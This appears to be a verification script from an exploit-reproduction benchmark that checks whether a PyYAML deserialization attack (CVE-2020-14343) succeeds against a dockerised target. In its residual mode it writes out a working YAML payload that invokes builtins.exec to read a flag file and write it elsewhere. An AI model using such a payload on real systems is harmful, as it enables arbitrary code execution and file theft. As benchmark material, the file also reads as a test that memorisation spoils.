#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0089, executor, flag_channel=X)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # original_poc import poc_common
if [[ "$MODE" == "--residual" ]]; then
  # residual（CVE-2020-14343）：!!python/object/new:type + extend:exec（heldout bypass 内嵌）
  cat > "$WORK_DIR/cand.json" <<'CANDEOF'
{"id": "cve-2020-14343-fullloader-tuple-map-classdict-residual", "payload": "!!python/object/new:type\nargs:\n- z\n- !!python/tuple []\n- extend: !!python/name:builtins.exec\nlistitems: \"open('/out/leak.txt','w').write(open('/flag').read())\"\n"}
CANDEOF
else
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
fi
# flag placeholder replace (file-based)
"$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
# wrap non-JSON candidate into multi-field dict (file-based)
"$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
export PCB_X="$RUN_FLAG"
CID_DEBUG="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" ps -q "$VERSION" 2>/dev/null | head -1)"
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 就绪等待：容器刚 start 时 pyyaml server 可能未监听，等端口可连（最多 60s）
READY=0
for _ in $(seq 1 20); do
  if curl -sf -m 2 "http://127.0.0.1:${PCB_TARGET_PORT:-0}/" >/dev/null 2>&1 ||      curl -s -m 2 -o /dev/null "http://127.0.0.1:${PCB_TARGET_PORT:-0}/" 2>/dev/null; then
    READY=1; break
  fi
  sleep 3
done
[[ "$READY" == 1 ]] || { echo "verify: target not ready on ${PCB_TARGET_PORT:-none}" >&2; exit 20; }
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get('X') == '$RUN_FLAG' else 10)" "$OUT"
